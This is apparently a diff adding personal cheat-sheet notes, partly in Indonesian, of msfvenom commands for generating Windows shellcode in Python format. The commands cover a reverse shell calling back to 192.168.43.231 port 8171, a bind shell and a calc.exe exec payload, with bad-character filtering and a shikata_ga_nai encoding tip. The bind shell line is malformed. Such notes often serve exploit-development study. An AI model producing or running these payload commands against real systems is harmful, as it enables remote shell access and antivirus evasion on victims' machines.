@@ -1,0 +1,12 @@
+reverse shell
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.231 LPORT=8171 -f python -v shellcode -b '\x40\x0A\x00\x0D\xff\x0d\x3d\x20'                                                         
+
+bind shell
+msfvenom -p windows/shell_bind_tcp LPORT=192.168.43 -f python -b '\xbadchars\' -v shellcode
+
+cmd
+msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
+
+#tips arsitektur + encoding
+-e x86/shikata_ga_nai
+
